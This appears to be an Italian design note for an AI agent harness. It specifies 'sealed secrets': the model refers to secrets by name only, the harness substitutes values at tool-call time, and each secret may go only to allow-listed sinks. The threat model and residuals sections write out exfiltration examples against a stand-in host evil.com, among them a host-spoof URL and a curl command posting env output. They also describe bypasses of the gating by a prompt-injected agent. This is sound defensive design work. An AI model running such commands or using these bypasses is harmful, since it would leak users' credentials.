---
name: sealed-secrets
description: "Gestione secret negli agenti: il VALORE non entra mai nel context del modello (sealed); il modello usa riferimenti {{secret:NAME}} sostituiti al confine del tool, con sink-gating per-secret. 3 vie di provisioning + regex-ingress. Design, non ancora implementato."
type: concept
status: design-draft
tags: [security, secrets, harness, guardrail, prompt-injection, training-vs-harness]
sources:
  - TG utente 2026-06-30 msg 577 (secret-vars: modello vede nome/descrizione, non il valore; ask-secret / terminale)
  - TG utente 2026-06-30 msg 578/579 (regex-ingress interception + ask-confirm sui falsi-positivi)
last_updated: 2026-06-30
---

# Sealed secrets — secret-reference per agenti

> **STATUS: DESIGN (non implementato).** Idea utente msg 577/578/579. Estende l'infra esistente (`secrets-guardrail`/`secrets-registry`/`secrets-redact`). Build da fare (centrato sul sink-gating, non sullo storage).

## Problema

Un agente ha bisogno di USARE segreti (API key, token) per eseguire operazioni, ma il **valore del segreto non deve mai**: (a) entrare nel context del modello (→ niente leak via output, niente invio al provider LM, niente memorizzazione/training), (b) finire nella persistenza in chiaro, (c) essere esfiltrabile da un modello prompt-injected. Oggi `add_secret` è un TOOL che il modello chiama → il valore è GIÀ nel suo context quando lo registra: gap.

## Catena (why → problema → soluzione)

- **WHY**: il modello deve operare con segreti "in tranquillità" (msg 577) senza vederli.
- **PROBLEMA**: due minacce DIVERSE — (1) **incidenti** (chiave incollata per sbaglio, tool che legge un `.env`); (2) **attacchi** (modello prompt-injected che USA un secret sigillato in un sink ostile: `curl evil.com?k={{secret:X}}` → lo ruba senza averlo mai visto = **exfiltration-via-use**). Lo storage sicuro NON copre la #2.
- **SOLUZIONE**: pattern **sealed-secret / secret-reference**: valore out-of-band nel registry; il modello vede solo **nome + descrizione** e usa **`{{secret:NAME}}`**; l'harness sostituisce il valore reale **al confine `tool_call`**, SOLO verso sink allow-listed; egress-redaction come backstop.

## Componenti

### 1. Registry sigillato
- `secrets` table/registry: `{name, description, value(sealed), allowed_sinks[], created, source}`. Il `value` non è mai esposto a tool di lettura.
- `list_secrets()` (tool model-facing) → ritorna SOLO `[{name, description, allowed_sinks}]`, **mai il valore**. Il modello sa cosa esiste e a cosa serve.

### 2. Tre vie di PROVISIONING (il valore non passa MAI dal modello)
1. **Terminale esplicito**: `set_secret NAME <value> --desc "..." --allow-host api.openai.com` (CLI/tool harness-side) → scrive nel registry. Il modello non è coinvolto.
2. **Model ask-secret**: il modello, accorgendosi che gli serve un segreto per un'operazione, invoca `ask_secret(name, why)` → l'harness mostra a TE un box "il modello chiede il secret NAME per X — inserisci il valore" → il valore va dritto nel registry, **non torna al modello**.
3. **Regex-ingress con conferma** (msg 578/579): su **input utente** o **tool-result**, se un valore matcha un pattern-secret (riuso dei pattern esistenti: `AIza…`/`sk-…`/JWT/`github_pat_…`/`Bearer`), l'harness **intercetta PRIMA che vada al LM** e lo **sigilla** sostituendolo con un riferimento. Per i falsi-positivi → **ask-confirm**: "sembra un secret (pattern X) — lo sigillo? nome/descrizione?". Blocca l'incidente #1 (paste accidentale).

### 3. Reference-injection (uso)
- Il modello mette `{{secret:NAME}}` negli args di un tool (bash, http, …).
- Hook `tool_call`: l'harness **sostituisce** `{{secret:NAME}}` col valore reale PRIMA dell'esecuzione → il valore va all'operazione, **non torna al modello**.
- Egress-redaction (esistente): il valore viene rimosso dal RISULTATO del tool prima che torni al modello.

### 4. Sink-gating per-secret (la VERA sicurezza — il 20% che vale l'80%)
- Ogni secret dichiara `allowed_sinks` (es. host fidati: `api.openai.com`). La sostituzione `{{secret:NAME}}` avviene **SOLO** se la destinazione dell'operazione è allow-listed.
- Blocco di sink ostili/esfiltranti: `echo {{secret}} > file`, outbound verso host non-allow-listed, scrittura in una var. Si aggancia al **pre-flight** esistente.
- Difende dall'**exfiltration-via-use** (il modello non vede il valore ma potrebbe usarlo per spedirlo altrove). **Senza sink-gating, il sealed-secret è teatro.**

## Config (opt-in, gemello degli altri toggle)
- `secrets.sinkGating = strict | warn | off` (default **strict**): allow-host fail-closed + https-only + deny scrittura-file/pipe + deny host-pinning (`curl --resolve/--connect-to/proxy/-H Host:`). Env `HARNESS_SECRETS_SINK_GATING`.
- `secrets.regexIngress = off | ask | auto` (default **off**): ⚠ **NON ancora cablata a un hook** (planned, review P2 2026-06-30) → tenuta `off` per non promettere una protezione inesistente. Quando sarà wired: `auto` sigilla i pattern ad alta confidenza, `ask` chiede sugli ambigui. Env `HARNESS_SECRETS_REGEX_INGRESS`.
- `redactEgress` **per-secret** (metadata, default **true**): opt-out per i secret CORTI/poco-entropici (OTP, PIN, una data, msg 603) dove la redazione globale del valore farebbe rumore. `false` (`set-secret --no-redact-egress`) → sigillato+iniettabile ma NON nel Set di egress (trade-off esplicito).

## Classificazione training-vs-harness (regola #11)
- **F-harness PIENA**: store sigillato + `list_secrets`(nome/desc) + reference-injection + egress-redaction + **sink-gating** + regex-ingress. Tutto deterministico, niente training.
- **S (DEGRADATA-MA-UTILE)**: il modello sa QUANDO/QUALE secret serve + usa `{{secret:NAME}}` + invoca `ask_secret`. Stato-senza-training: il modello vede la lista e i riferimenti → usabile; un fallback deterministico può anche auto-suggerire il secret per operazioni note. **Reward sull'OUTCOME** (operazione riuscita SENZA leak), mai sul "ha usato un secret".

## Stratificazione delle difese (non illudersi)
| difesa | contro | garanzia |
|---|---|---|
| valore mai-in-context (provisioning out-of-band + ref-injection) | leak via output/provider/training | forte (per i secret sealed) |
| regex-ingress + ask-confirm | INCIDENTI (paste accidentale, .env letto) | riduce, non azzera (una regex non becca tutto) |
| egress-redaction (backstop) | valore che ricompare in un output (content+`details`) | best-effort (literal-match: un modello può trasformarlo/encodare). Invariante P1: ogni sealed-value redatto, anche corto — salvo `redactEgress=false` (opt-out esplicito OTP) |
| **sink-gating per-secret** | **ATTACCHI** (exfiltration-via-use, prompt-injection) | allow-host fail-closed (incl. anti-spoof `#`/`?` e anti host-pinning); resta euristico su shell composta/bare-host (vedi §residui) |

## Stato implementazione + residui (review-loop 2026-06-30, 17 finding confermati)

> Range git commit `706983d..2318f89`. Priorità utente (msg 593): **P1** valore mai-al-provider (✅ garantito dall'architettura value-mai-in-context) + **P2** mai-nei-transcript (✅ nostri store; redazione content+`details` + conversation-capture).

**Fix applicati:**
- **P0 host-spoof** (`extractHosts`): l'authority terminava solo su `/` → `https://evil.com#.openai.com` faceva suffix-match con `.openai.com` mentre curl si connette a `evil.com`. Fix: termina su `?`/`#`/`\` + valida host DNS-charset (fail-closed sui residui). + deny **host-pinning** (`--resolve`/`--connect-to`/proxy/`-H Host:`).
- **P1 backstop short-secret**: `setSecret` ignorava il rifiuto di `add_secret` (guard min-len) → un secret corto era iniettabile ma non redatto. Fix: `registerEgressRaw` (no guard: provisioning out-of-band) → invariante "ogni sealed-value redigibile". + `redactEgress` per-OTP (opt-out esplicito).
- **P2 details**: `tool_result.details` ora redatto (non solo `content`) — poteva persistere nel log nativo di pi.
- **P2 regexIngress dead-code**: declassato a `off`/planned (era documentato attivo → falsa sicurezza).

**Residui DE-PRIORITIZZATI** (msg 593, *exfiltration-via-use* = "hard problem" esplicitamente rimandato; il sink-gating è dichiarato layer best-effort, NON un confine di sicurezza — P1 resta garantito a prescindere):
- **bare-host / tool MCP strutturati**: una destinazione senza `scheme://` (`curl evil.com`, `{host:'evil.com'}`) non è vista da `extractHosts` → un secret senza `allowedSinks` può uscirvi. Mitigazione futura: gating per-tool sul TIPO (rete vs locale), non sul parsing-testo.
- **comandi shell composti**: `curl allow.com ...; curl evil.com -d @<(env)` — il gate vede solo l'host allow-listed. Futuro: trattare `;`/`&&`/`|`/`$(...)`/`<(...)` + un ref come fail-closed in strict.
- **hook-order** (latente): l'injection muta `event.input` condiviso; oggi `pre-flight` precede `secrets-guardrail` per ordine-fs, non per invariante imposta. Futuro: garantire injection-as-last + nessun hook che persista `event.input` dopo. (Nessun leak attuale: pi clona gli args via `structuredClone` prima di `execute` → la history conserva il placeholder; test `injectIntoStrings`-puro presidia la regressione.)

## Cosa abbiamo già vs nuovo
- **Già**: pattern statici (`secrets-redact.mjs`), egress-redaction su `tool_result` + dynamic-map opaca (`secrets-guardrail.ts`), `add_secret` con guardia min-len/distinct (`secrets-registry.mjs`).
- **Nuovo**: provisioning out-of-band (terminale + ask-secret) così il valore non passa dal modello · `list_secrets`(nome/desc) · reference-injection `{{secret:NAME}}` al `tool_call` · **sink-gating per-secret** · regex-ingress-con-conferma · config.

## Open questions
- Modello di sink-gating: allow-host per-secret (forte) vs deny-list di sink-esfiltranti (più semplice da iniziare) vs taint-tracking (pesante)? → reco: allow-host per-secret, con deny-list come default conservativo per i secret senza `allowed_sinks`.
- `ask_secret` headless (cron/SDK senza TUI): come si chiede il valore? → forse non-disponibile headless (il secret deve essere pre-provisionato da terminale).
- ~~Verifica/testbook: probe output-senza-valore + red-team sink-gating-blocca~~ → ✅ coperte (test red-team block 8: host-spoof/host-pinning bloccati, `injectIntoStrings` puro sull'input). Resta da implementare il **wiring `regexIngress`** (hook input/tool_result + confirm-UI) — vedi `wiki/todo.md`.

## Link
- [[concepts/secret-section-exfiltration-defense]] (difesa esfiltrazione, parente)
- [[concepts/training-vs-harness-classification]] (F/S)
- `harness/.pi/extensions/secrets-guardrail.ts` · `harness/src/secrets-registry.mjs` · `harness/src/secrets-redact.mjs` (infra esistente)
- [[concepts/untrusted-content-delimiting]] (inbox/tool-result come dato, non istruzioni — vettore della exfiltration-via-use)
